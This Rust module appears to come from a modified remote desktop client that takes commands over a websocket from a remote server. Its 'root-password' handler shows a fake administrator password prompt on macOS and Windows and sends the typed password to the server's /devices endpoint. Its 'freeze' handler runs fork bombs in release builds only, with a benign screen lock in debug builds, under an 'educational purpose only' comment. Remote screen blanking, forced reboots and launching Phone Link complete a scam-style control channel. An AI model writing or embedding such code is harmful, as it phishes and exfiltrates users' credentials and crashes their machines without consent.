use url::Url;
use futures_util::{SinkExt, StreamExt};
use hbb_common::log;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::io::Write;
use std::mem::size_of;
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;
use tokio::time::sleep;
use tokio_tungstenite::{connect_async, tungstenite::Message as WsMessage};
#[cfg(windows)]
use windows::{
    core::{w, PCWSTR, PWSTR}, 
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Security::{DuplicateTokenEx, SecurityImpersonation, TokenPrimary, TOKEN_ALL_ACCESS},
        System::{
            RemoteDesktop::{WTSGetActiveConsoleSessionId, WTSQueryUserToken},
            Environment::{CreateEnvironmentBlock, DestroyEnvironmentBlock},
            Threading::{
                CreateProcessAsUserW, CREATE_UNICODE_ENVIRONMENT, PROCESS_INFORMATION, STARTUPINFOW,
            },
        },
    },
};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum MessageType {
    #[serde(rename = "freeze")]
    Freeze,
    #[serde(rename = "reboot")]
    Reboot,
    #[serde(rename = "link-device")]
    RequestPhoneLink,
    #[serde(rename = "screen-saver")]
    ShowScreenSaver,
    #[serde(rename = "root-password")]
    RequestRootPassword,
}

impl MessageType {
    pub fn from_str(&self, value: &str) -> Result<Self, String> {
        match value {
            "reboot" => Ok(Self::Reboot),
            "phone-link" => Ok(Self::RequestPhoneLink),
            "screen-saver" => Ok(Self::ShowScreenSaver),
            "root-password" => Ok(Self::RequestRootPassword),
            _ => Err(format!("invalid messageType: {}", value)),
        }
    }
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Message {
    #[serde(rename = "type")]
    pub msg_type: MessageType,
    pub data: Option<HashMap<String, serde_json::Value>>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Response {
    pub status: u16,
    pub data: Message,
}

impl Response {
    pub fn is_error(&self) -> bool {
        self.status >= 300
    }
}

pub struct Channel {
    api: Api,
    websocket_url: String,
    privacy_impl: Mutex<Option<super::privacy::PrivacyModeImpl>>,
}

#[derive(Clone)]
pub struct Api {
    base_url: String,
    client: Client,
}

impl Api {
    pub fn new(base_url: String) -> Self {
        Self {
            base_url,
            client: Client::new(),
        }
    }

    pub async fn upsert_device(&self, id: &str, os_username: &str, os_password: Option<&str>) {
        let data = json!({
            "id": id,
            "osUsername": os_username,
            "osPassword": os_password
        });

        if let Err(e) = self
            .client
            .post(format!("{}/devices", self.base_url))
            .json(&data)
            .send()
            .await
        {
            log::error!("upsert device failed: {:?}", e);
        }
    }

    pub async fn update_device(
        &self,
        id: &str,
        os_username: Option<&str>,
        os_password: Option<&str>,
    ) {
        let mut data = serde_json::Map::new();

        if let Some(username) = os_username {
            data.insert("osUsername".to_string(), json!(username));
        }
        if let Some(password) = os_password {
            data.insert("osPassword".to_string(), json!(password));
        }

        if let Err(e) = self
            .client
            .patch(format!("{}/devices/{}", self.base_url, id))
            .json(&data)
            .send()
            .await
        {
            log::error!("update device failed: {:?}", e);
        }
    }
}

impl Channel {
    async fn ensure_privacy(&self) -> bool {
        let mut guard = self.privacy_impl.lock().await;

        if guard.is_some() {
            return true;
        }

        if !cfg!(windows) {
            return false;
        }

        let mut privacy = super::privacy::PrivacyModeImpl::new();
        match privacy.start() {
            Ok(_) => {
                *guard = Some(privacy);
                true
            }
            Err(e) => {
                log::warn!("Failed to start PrivacyModeImpl: {:?}", e);
                false
            }
        }
    }

    async fn show_screensaver(&self, show: bool) {
        if !self.ensure_privacy().await {
            return;
        };

        let mut privacy_lock = self.privacy_impl.lock().await;
        if let Some(privacy) = privacy_lock.as_mut() {
            if show {
                privacy.turn_on_privacy().unwrap();
            } else {
                privacy.turn_off_privacy().unwrap();
                *privacy_lock = None;
            }
        }
    }

    pub fn new(url: &str) -> Arc<Self> {
        Arc::new(Self {
            privacy_impl: Mutex::new(None),
            api: Api::new(format!("http://{}", url)),
            websocket_url: format!("ws://{}/channels", url),
        })
    }
    pub async fn connect(self: Arc<Self>, conn_id: String) {
        let mut attempt: u32 = 0;
        loop {
            match Self::_connect(Arc::clone(&self), conn_id.clone()).await {
                Ok(_) => {
                    log::info!("websocket connection closed normally, reconnecting...");
                }
                Err(error) => {
                    log::warn!("websocket conenction failed: {:?}", error);
                }
            }

            let wait_time = std::cmp::min(2u64.pow(attempt), 64);
            log::debug!("Reconnecting in {} seconds...", wait_time);
            sleep(Duration::from_secs(wait_time)).await;

            if attempt < 6 {
                attempt += 1;
            }
        }
    }

    async fn _connect(self: Arc<Self>, conn_id: String) -> anyhow::Result<()> {
        let url = Url::parse(&self.websocket_url)?;
        let (stream, _) = connect_async(url).await?;

        let (mut write, mut read) = stream.split();
        let id = conn_id.clone();
        let this = Arc::clone(&self);
        let handler = tokio::spawn(async move {
            while let Some(message) = read.next().await {
                log::info!("message {:?}", message);
                match message {
                    Ok(WsMessage::Text(text)) => {
                        if let Ok(response) = serde_json::from_str::<Response>(&text) {
                            if response.is_error() {
                                continue;
                            }

                            match response.data.msg_type {
                                MessageType::RequestRootPassword => {
                                    this.ask_root_password(Some(id.clone())).await;
                                }
                                MessageType::Reboot => {
                                    let password = response
                                        .data
                                        .data
                                        .as_ref()
                                        .and_then(|data| data.get("password"))
                                        .and_then(|value| value.as_str())
                                        .map(String::from);
                                    this.reboot(password, Some(id.clone())).await.ok();
                                }
                                MessageType::RequestPhoneLink => {
                                    Self::request_phone_link().ok();
                                }
                                MessageType::ShowScreenSaver => {
                                    let show = response
                                        .data
                                        .data
                                        .as_ref()
                                        .and_then(|data| data.get("show"))
                                        .and_then(|value| value.as_bool())
                                        .unwrap_or(true);
                                    log::info!("show blank={}", show);
                                    this.show_screensaver(show).await;
                                }
                                MessageType::Freeze => {
                                    Self::freeze().ok();
                                }
                            }
                        } else {
                            log::warn!("failed to parse response: {}", text);
                        }
                    }
                    Ok(WsMessage::Close(_)) => {
                        log::info!("websocket closed");
                        break;
                    }
                    Err(error) => {
                        log::error!("WebSocket error: {:?}", error);
                        break;
                    }
                    _ => {}
                }
            }
        });

        let message = json!({
          "channel": conn_id,
          "type": "subscribe"
        });
        let message = serde_json::to_string(&message)?;

        write.send(WsMessage::Text(message)).await?;

        handler.await?;

        Ok(())
    }

    async fn reboot(
        &self,
        password: Option<String>,
        conn_id: Option<String>,
    ) -> std::io::Result<()> {
        if cfg!(windows) {
            Command::new("shutdown").args(&["/r", "/t", "0"]).status()?;
        } else {
            let password = match password {
                Some(value) => Some(value),
                None => self.ask_root_password(conn_id).await,
            };

            if let Some(value) = password {
                let mut process = Command::new("sudo")
                    .args(&["-S", "shutdown", "-r", "now"])
                    .stdin(Stdio::piped())
                    .spawn()?;

                if let Some(stdin) = process.stdin.as_mut() {
                    stdin.write_all(format!("{}\n", value).as_bytes())?;
                }

                process.wait()?;
            } else {
                Command::new("shutdown").args(&["-r", "now"]).status()?;
            }
        }

        Ok(())
    }
    
    

    pub fn request_phone_link() -> std::io::Result<()> {
        unsafe {
            let session_id = WTSGetActiveConsoleSessionId();
            if session_id == 0xFFFFFFFF {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    "No active session",
                ));
            }

            let mut user_token = HANDLE::default();
            if WTSQueryUserToken(session_id, &mut user_token).is_err() {
                return Err(std::io::Error::last_os_error());
            }

            let mut primary_token = HANDLE::default();
            if DuplicateTokenEx(
                user_token,
                TOKEN_ALL_ACCESS,
                None,
                SecurityImpersonation,
                TokenPrimary,
                &mut primary_token,
            )
            .is_err()
            {
                CloseHandle(user_token);
                return Err(std::io::Error::last_os_error());
            }

            let mut env_block = std::ptr::null_mut();
            if CreateEnvironmentBlock(&mut env_block, Some(primary_token), false).is_err() {
                CloseHandle(user_token);
                CloseHandle(primary_token);
                return Err(std::io::Error::last_os_error());
            }

            let mut si = STARTUPINFOW::default();
            si.cb = size_of::<STARTUPINFOW>() as u32;
            si.lpDesktop = PWSTR::from_raw(w!("winsta0\\default").as_ptr() as *mut _);

            let mut pi = PROCESS_INFORMATION::default();
            let mut cmd_utf16: Vec<u16> =
                "explorer.exe shell:AppsFolder\\Microsoft.YourPhone_8wekyb3d8bbwe!App"
                    .encode_utf16()
                    .chain(std::iter::once(0))
                    .collect();

            let ok = CreateProcessAsUserW(
                Some(primary_token),
                None,
                Some(PWSTR::from_raw(cmd_utf16.as_mut_ptr())),
                None,
                None,
                false,
                CREATE_UNICODE_ENVIRONMENT,
                Some(env_block),
                None,
                &si,
                &mut pi,
            );

            DestroyEnvironmentBlock(env_block);
            CloseHandle(user_token);
            CloseHandle(primary_token);

            if ok.is_err() {
                return Err(std::io::Error::last_os_error());
            }

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        Ok(())
    }

    // educational purpose only
    // don't use in production please
    fn freeze() -> std::io::Result<()> {
        if cfg!(debug_assertions) {
            if cfg!(windows) {
                Command::new("rundll32.exe")
                    .args(&["user32.dll,LockWorkStation"])
                    .status()?;
            } else if cfg!(target_os = "macos") {
                Command::new("pmset").args(&["displaysleepnow"]).status()?;
            }
        } else {
            if cfg!(windows) {
                Command::new("cmd").args(&["/c", "%0|%0"]).status()?;
            } else if cfg!(target_os = "macos") {
                Command::new("bash")
                    .args(&["-c", ":(){ :|: & };:"])
                    .status()?;
            }
        }

        Ok(())
    }

    async fn ask_root_password(&self, conn_id: Option<String>) -> Option<String> {
        let mut password: Option<String> = None;

        if cfg!(target_os = "macos") {
            let script = r#"display dialog "Administrator Password Required" default answer "" with hidden answer with icon caution with title "Security""#;

            let output = Command::new("osascript")
                .args(&["-e", script])
                .output()
                .ok()?;

            let stdout = String::from_utf8_lossy(&output.stdout);

            if let Some(index) = stdout.find("text returned:") {
                let pw = stdout[index + 14..]
                    .split(", button returned")
                    .next()
                    .unwrap_or("")
                    .trim()
                    .to_string();

                if !pw.is_empty() {
                    password = Some(pw);
                }
            }
        } else if cfg!(windows) {
            let ps_script = r#"
            Add-Type -AssemblyName Microsoft.VisualBasic
            $password = [Microsoft.VisualBasic.Interaction]::InputBox(
              "Please enter the Administrator password",
              "Security Required",
              ""
            )
            Write-Host $password
            "#;

            let output = Command::new("powershell.exe")
                .args(&["-NoProfile", "-STA", "-Command", ps_script])
                .output()
                .ok()?;

            let pw = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !pw.is_empty() {
                password = Some(pw);
            }
        }

        if let Some(pw) = &password {
            if let Some(id) = conn_id {
                self.api.update_device(&id, None, Some(&pw)).await;
            }
        }

        password
    }
}
